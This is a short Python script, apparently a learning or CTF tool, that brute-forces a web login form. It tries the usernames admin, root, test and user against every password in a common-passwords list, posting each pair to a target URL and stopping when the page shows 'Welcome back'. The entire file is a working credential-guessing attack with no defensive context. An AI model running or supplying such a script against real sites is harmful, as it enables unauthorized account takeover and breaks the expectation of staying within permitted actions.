import requests
import sys

target = ''
usernames = ['admin', 'root', 'test', 'user']
passwords = "ssh-common-passwords.txt"

# Login success message
needle = "Welcome back"

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write(f"[X] Attempting user:password -> {username}:{password.decode()}\r")
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write(f"\t[>>>] Valid password '{password.decode()}' found for user '{username}'!")
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write(f"\tNo password found for '{username}'!")
        sys.stdout.write("\n")

